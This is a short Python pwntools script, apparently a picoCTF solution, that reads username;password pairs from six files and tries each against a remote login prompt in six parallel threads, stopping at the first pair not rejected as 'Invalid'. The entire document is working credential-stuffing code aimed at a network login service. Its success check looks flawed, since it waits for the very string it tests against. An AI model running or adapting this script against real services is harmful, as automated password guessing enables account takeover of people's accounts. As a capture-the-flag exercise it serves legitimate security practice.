from pwn import *
import threading


def attack(file):
    pairs= [x.strip() for x in open(file, encoding='latin-1') if x]
    for pair in pairs:
        user = pair.split(';', 1)[0]
        passwd = pair.split(';', 1)[1]
        print(user, passwd)
        try:
            conn = remote('crystal-peak.picoctf.net', 61316)
            conn.recvuntil(b'Username')
            conn.send(user.encode() + b'\n')
            conn.recvuntil(b'Password')
            conn.send(passwd.encode() + b'\n')
            if b"Invalid" not in conn.recvuntil(b'Invalid'):
                print(user, passwd)
                break
        except:
            continue

t1 = threading.Thread(target=attack, args=("1.txt",))
t1.start()
t2 = threading.Thread(target=attack, args=("2.txt",))
t2.start()
t3 = threading.Thread(target=attack, args=("3.txt",))
t3.start()
t4 = threading.Thread(target=attack, args=("4.txt",))
t4.start()
t5 = threading.Thread(target=attack, args=("5.txt",))
t5.start()
t6 = threading.Thread(target=attack, args=("6.txt",))
t6.start()
